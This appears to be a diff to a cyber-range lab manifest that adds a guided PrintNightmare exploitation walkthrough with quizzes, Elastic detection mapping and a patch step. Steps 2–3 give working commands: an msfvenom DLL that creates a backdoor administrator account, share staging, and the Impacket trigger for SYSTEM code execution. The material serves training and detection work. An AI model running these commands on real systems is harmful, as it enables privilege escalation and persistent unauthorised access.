@@ -94,14 +94,25 @@ detection:
     - "Windows Event 4688 (Process create — spoolsv.exe child)"
 
 targets:
+  # 2026-05-23 audit fix: PrintNightmare affects every Windows SKU + role
+  # where the Print Spooler service runs (default ON on Win7+, all client
+  # editions, every server role). Previously narrowed to DC+member servers
+  # 2012-2022 which hid the technique from workstations and Win10/11 hosts
+  # in the lab. Per MSRC CVE-2021-34527 affected matrix: Windows 7+,
+  # Server 2008+, all editions.
   supported_os:
     - family: windows
-      min_version: "2012"
+      min_version: "7"
+      max_version: "11"
+      edition_in: []  # all client editions
+    - family: windows
+      min_version: "2008"
       max_version: "2022"
-      edition_in: ["Datacenter", "Standard"]
+      edition_in: []  # all server SKUs
   required_roles:
-    - domain_controller
+    - workstation
     - member_server
+    - domain_controller
   required_services: []   # spooler is checked at install-time, not target-time
   required_domain_function_level: null
 
@@ -252,5 +263,142 @@ cost:
   storage_mb: 0
   cpu_pct: 0
   detectability: loud
+
+curriculum:
+  title: "PrintNightmare — RCE via Print Spooler"
+  summary: >
+    Guided walkthrough of CVE-2021-34527 + CVE-2021-1675 against the lab's
+    deliberately-unpatched Print Spooler. You will identify the vulnerable
+    service, plant a malicious printer driver via authenticated RPC, trigger
+    SYSTEM-level driver loading, and walk through the Elastic detections that
+    fire on each phase.
+  learning_objectives:
+    - "Explain why the Print Spooler service runs as SYSTEM on Windows servers."
+    - "Use rpcdump / Impacket to identify the vulnerable RPC endpoints (MS-RPRN, MS-PAR)."
+    - "Drop a malicious DLL and trigger loading via AddPrinterDriverEx."
+    - "Identify which Elastic rules fire on the install phase vs the exploit phase."
+  prerequisites:
+    - "Authenticated low-privilege domain user credentials"
+    - "Impacket suite installed on the attacker box"
+    - "SMB share writable by the low-priv user"
+  estimated_total_minutes: 30
+  steps:
+    - id: "01-confirm-spooler"
+      title: "Confirm the Print Spooler is reachable + vulnerable"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find the vulnerable spooler
+
+        The Print Spooler runs as `LocalSystem` on every Windows server by
+        default. Patched hosts set
+        `HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\RestrictDriverInstallationToAdministrators=1`
+        so only admins can load drivers. Lab hosts are intentionally unpatched.
+
+        Confirm the target is reachable:
+
+        ```bash
+        rpcdump.py @10.0.20.20 | grep -iE "spooler|MS-RPRN|MS-PAR"
+        ```
+
+        You should see Protocol `[MS-RPRN]: Print System Remote Protocol`
+        listening on a high port. That's the install vector.
+    - id: "02-stage-payload"
+      title: "Stage a malicious printer driver DLL"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 2 — Build a payload DLL + drop it on a writable share
+
+        msfvenom generates a SYSTEM-context payload as a DLL:
+
+        ```bash
+        msfvenom -p windows/x64/exec CMD="cmd /c net user pwn3d Password1! /add && net localgroup administrators pwn3d /add" \
+                 -f dll -o /tmp/evil.dll
+        ```
+
+        Copy it to a share the low-priv user can write:
+
+        ```bash
+        smbclient //10.0.20.20/share -U LAB.LOCAL\\lowpriv%Password1 \
+            -c "put /tmp/evil.dll evil.dll"
+        ```
+      assessment:
+        question: "Why does the payload need to be on a UNC path the *target* can reach (not just the attacker)?"
+        options:
+          - "The target downloads the DLL itself via the AddPrinterDriverEx RPC — it must be able to read the UNC."
+          - "Windows blocks loading DLLs from network shares entirely; this is just a test."
+          - "Impacket bundles the DLL into the RPC packet directly."
+          - "The Print Spooler runs as the low-priv user, not SYSTEM."
+        correct_index: 0
+        explanation: >
+          AddPrinterDriverEx makes the *server* fetch the driver DLL from the
+          UNC path you supply. The path is dereferenced by the Spooler running
+          as SYSTEM, so it needs to be reachable from the target host (not the
+          attacker host). That's also why a local file:// path doesn't work.
+    - id: "03-trigger-load"
+      title: "Trigger the SYSTEM-context driver load"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 3 — Fire AddPrinterDriverEx
+
+        Impacket's `cve-2021-1675.py` (despite the name, it works for 34527 too)
+        wraps the RPC call:
+
+        ```bash
+        python3 cve-2021-1675.py LAB.LOCAL/lowpriv:'Password1'@10.0.20.20 \
+                '\\10.0.20.42\share\evil.dll'
+        ```
+
+        On success the target prints `pwn3d` to the Administrators group. The
+        DLL is loaded by `spoolsv.exe` (PID owned by SYSTEM) — you now have
+        SYSTEM-context code execution on a server you only had Domain User on.
+    - id: "04-detection-mapping"
+      title: "Detection coverage on the blue side"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 4 — What the SOC sees
+
+        Three Elastic rules cover this:
+
+        | Rule | Fires on |
+        |---|---|
+        | Suspicious Print Spooler File Deletion | spoolsv.exe touching `system32/spool/drivers/x64/3` |
+        | Suspicious DLL Loaded for Persistence or Privilege Escalation | non-signed DLL loaded by spoolsv.exe |
+        | Print Spooler Suspicious Child Process | cmd.exe / powershell.exe spawned by spoolsv.exe |
+
+        Open the **Detections** tab on this drawer to see the actual rule UUIDs
+        the manifest carries. The most reliable signal is the suspicious-child
+        rule — defenders should pin alerting on it. Patching this CVE removes
+        the install vector but the detection ring still catches lateral re-use
+        of the same TTP.
+      assessment:
+        question: "Which artefact is the highest-fidelity signal that PrintNightmare was exploited (vs a benign driver install)?"
+        options:
+          - "Event 4720 — User account created"
+          - "Cmd.exe or powershell.exe spawned by spoolsv.exe"
+          - "Event 4625 — Failed logon"
+          - "A new Print Server installed in AD"
+        correct_index: 1
+        explanation: >
+          The Print Spooler service should never spawn an interactive shell.
+          `spoolsv.exe → cmd.exe` is the signal SOCs key off — Event 4720 also
+          fires on legitimate user creation; failed logons fire on every
+          mistype. The child-process pattern is the smoking gun.
+    - id: "05-apply-patch"
+      title: "Apply the patch + verify"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 5 — Patch + re-test
+
+        Click the **Patch** action on this card's row. The bolt-on's patch
+        block sets
+        `RestrictDriverInstallationToAdministrators=1` and restarts the
+        Spooler service.
+
+        Re-run Step 3. The RPC call now fails with `RPRN_ERROR_ACCESS_DENIED`
+        because the policy blocks non-admin driver installation. The exploit
+        DLL never loads.
+
+        > **Rollback:** the manifest declares `patch_revert`, so you can
+        > re-arm the lab with a single click from the same row.
 
 status: stable
